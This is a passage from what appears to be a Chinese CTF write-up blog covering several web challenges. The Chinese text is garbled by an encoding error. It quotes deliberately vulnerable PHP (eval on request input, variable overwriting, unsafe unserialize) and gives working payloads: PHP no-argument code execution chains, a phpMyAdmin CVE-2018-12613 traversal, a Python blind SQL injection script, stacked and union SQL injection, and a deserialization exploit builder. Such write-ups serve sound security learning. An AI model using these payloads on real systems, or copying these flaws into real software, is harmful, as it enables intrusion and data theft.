class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤data filter php pharç­‰ä¼ªåè®®</p><p>è¿‡æ»¤åˆ†å·</p><p>è¿‡æ»¤et na info dec bin hex oct pi log</p><h2 id="åˆ©ç”¨session-idä»£æ›¿flag-php"><a href="#åˆ©ç”¨session-idä»£æ›¿flag-php" class="headerlink" title="åˆ©ç”¨session_idä»£æ›¿flag.php"></a>åˆ©ç”¨session_idä»£æ›¿flag.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:PHPSESSID=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="/../images/image-20231114093203760.png" alt="image-20231114093203760"></p><h2 id="åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag-php"><a href="#åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag-php" class="headerlink" title="åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag.php"></a>åˆ©ç”¨å‡½æ•°æ‰¾åˆ°å¹¶ä»£æ›¿flag.php</h2><p>localeconv()å›æ˜¾æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæ•°ç»„æ˜¯å­—ç¬¦.</p><p>pos()ä¼ å…¥æ•°ç»„ï¼Œå›æ˜¾ç¬¬ä¸€ä¸ªæ•°ç»„çš„å€¼</p><p>pos(localeconv())ç›¸å½“äºç­‰å·</p><p>scandir(.)ä»¥æ•°ç»„å½¢å¼å›æ˜¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</p><p>print_r()è¾“å‡º</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="keyword">pos</span>(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231114094130072.png" alt="image-20231114094130072"></p><p>array_reverse()æ•°ç»„åè½¬</p><p>next()æ•°ç»„æŒ‡é’ˆç§»åŠ¨ä¸‹ä¸€ä½</p><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p><img src="/../images/image-20231114094459315.png" alt="image-20231114094459315"></p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>dirsearchæ‰«ç›®å½•ï¼Œå‘ç°.gitæ³„éœ²</p><p>ä¸Šgithack</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>å®¡è®¡ï¼š</p><p>å¦‚æœpostä¼ å‚flagå’Œgetä¼ å‚flagéƒ½ä¸ä¸ºç©ºæ—¶è¾“å‡ºdogå¹¶é€€å‡º</p><p>å¦‚æœpostä¼ å‚flag&#x3D;flagæˆ–getä¼ å‚flag&#x3D;flagæ—¶ï¼Œè¾“å‡ºcatå¹¶é€€å‡º</p><p>foreachéå†ï¼Œå¦‚æœgetä¼ å‚flag&#x3D;xä¸”x!&#x3D;flagè¾“å‡ºhandsomeå¹¶é€€å‡º</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><p><strong>å˜é‡è¦†ç›–</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><p>$x &#x3D; yds $y &#x3D; flag</p><p>$$x &#x3D; $yds $$y &#x3D; $flag</p><p>$yds &#x3D; $flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>$is &#x3D; $flag</p><p>è¾“å‡º$is å¿…é¡»æ»¡è¶³get&#x2F;postä¼ å‚flag&#x3D;flag</p><h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p><strong>CVE-2018-12613</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../flag</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h1><p><img src="/../images/image-20231104151346329.png" alt="image-20231104151346329"></p><p>è¾“å…¥1æ­£ç¡®å›æ˜¾ï¼Œå…¶ä»–åˆ™é”™è¯¯ï¼Œç›²æ³¨</p><p><strong>æ‹¬å·ä»£æ›¿ç©ºæ ¼æ¥åˆ†å‰²</strong></p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=(select(ascii(mid(flag,1,1))=102)from(flag))</span><br></pre></td></tr></table></figure><p>pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>(<span class="params">url</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span>                     <span class="comment">#æ¥æ”¶ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):     <span class="comment">#flagä¸€èˆ¬ä¸è¶…è¿‡50ä¸ªå­—ç¬¦</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:  <span class="comment">#string.printableå°†ç»™å‡ºæ‰€æœ‰çš„æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œascii_letterså’Œç©ºæ ¼</span></span><br><span class="line">            payload=<span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i)) <span class="comment">#ordå‡½æ•°ç”¨æ¥è·å–å•ä¸ªå­—ç¬¦çš„asciiç </span></span><br><span class="line">            post = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            result = requests.post(url=url,data=post)   <span class="comment">#æäº¤postè¯·æ±‚</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                flag += i   <span class="comment">#ç”¨flagæ¥æ”¶ç›²æ³¨å¾—åˆ°çš„ç»“æœ</span></span><br><span class="line">                <span class="built_in">print</span>(flag) <span class="comment">#æ‰“å°ç»“æœ</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">&#x27;http://935ab885-c359-48b2-8673-50710c1c3e72.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    blind_sql(url)</span><br></pre></td></tr></table></figure><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>é»‘åå•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject)</span><br></pre></td></tr></table></figure><p>å°è¯•äº†å¤§å°å†™ã€æ³¨é‡Šã€å†…è”æ³¨é‡Šéƒ½æ²¡ç”¨</p><h2 id="å †å æ³¨å…¥ï¼š"><a href="#å †å æ³¨å…¥ï¼š" class="headerlink" title="å †å æ³¨å…¥ï¼š"></a><strong>å †å æ³¨å…¥ï¼š</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show databases; #</span><br><span class="line">-1&#x27;; show tables from ctftraining; #</span><br><span class="line">-1&#x27;; show tables; #</span><br><span class="line">-1&#x27;; show columns from FlagHere  ; #</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°å­—æ®µFlagHere</p><p>è¿™é‡Œç”¨<strong>Handler</strong>è¯»å–</p><p>Handler open æ‰“å¼€ä¸€ä¸ªè¡¨</p><p>Handler  read è¯»å–</p><p>Handler closeå…³é—­</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1;</span><br><span class="line">Handler FlagHere open ;</span><br><span class="line">Handler FlagHere read first;</span><br><span class="line">Handler FlagHere close;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>union select 1,2,3</p><p>é€ä¸ªæµ‹è¯•adminï¼Œå‘ç°usernameåœ¨ç¬¬äºŒä¸ªå­—æ®µ</p><p>è”åˆæ³¨å…¥<strong>åˆ›å»ºä¸€æ¡ä¸´æ—¶æ•°æ®</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure><h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h2><p>ä»ä¸Šå¾€ä¸‹çœ‹ï¼Œå¦‚æœè§¦å‘__constructæ–¹æ³•ï¼Œä¼šèµ‹å€¼op&#x3D;1ï¼Œå¹¶ä¸”è°ƒç”¨processæ–¹æ³•</p><p>å†çœ‹processæ–¹æ³•ï¼Œå¦‚æœop&#x3D;1ï¼Œåˆ™ä¼šè°ƒç”¨write()æ–¹æ³•ï¼ŒæŠŠ<em>Hello World!<em>å†™å…¥</em>&#x2F;tmp&#x2F;tmpfile</em></p><p>è€Œæœ€åä¸€è¡Œå¯¹getä¼ å‚strè¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œå¹¶ä¸”ååºåˆ—åŒ–ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨åˆ›å»ºå¯¹è±¡ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘__constructæ–¹æ³•</p><p>å¦‚æœæƒ³è¦è§¦å‘__destructæ–¹æ³•ï¼Œå¿…é¡»ä½¿op&#x3D;2ç»•è¿‡ifåˆ¤æ–­,è°ƒç”¨processæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨readæ–¹æ³•ï¼Œå†åˆ©ç”¨filenameå±æ€§å»è¯»å–flag.php</p><h2 id="æ„é€ "><a href="#æ„é€ " class="headerlink" title="æ„é€ "></a>æ„é€ </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$op</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op=<span class="variable">$op</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>(<span class="number">2</span>,<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸€ä¸‹</p><p><img src="/../images/image-20231103193613731.png" alt="image-20231103193613731"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><p><img src="/../images/image-20231103193653759.png" alt="image-20231103193653759"></p><h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 